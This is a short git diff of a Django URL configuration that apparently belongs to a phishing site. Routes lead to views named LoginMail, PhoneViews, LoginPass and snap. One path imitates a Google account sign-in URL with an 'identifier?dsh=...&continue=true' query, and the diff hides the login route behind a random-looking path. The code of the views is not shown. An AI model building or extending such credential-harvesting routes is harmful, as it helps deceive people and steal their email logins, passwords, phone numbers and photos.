@@ -23,10 +23,10 @@ from django.conf.urls.static import static
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('', views.home, name="home"),
-    path('login/', views.LoginMail, name="login"),
+    path('login/sjbahewhgbjhwemfsdhjgfyuegfh', views.LoginMail, name="login"),
     path('phone/token/sjbahewhgbjhwemfsdhjgfyuegfh', views.PhoneViews, name="phone"),
     path('token=jdsbjhdbjh/identifier?dsh=S176162651683841885269952&continue=true', views.LoginPass, name="pass"),
     path('pics/snap/adjhgerjywgeygh', views.snap, name="snap"),
-    path('text/', views.AsyncView.as_view(), name="text"),
-    path('phone/', views.PhoneNumView.as_view(), name='phtake'),
+    # path('text/', views.AsyncView.as_view(), name="text"),
+    # path('phone/', views.PhoneNumView.as_view(), name='phtake'),
 ] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
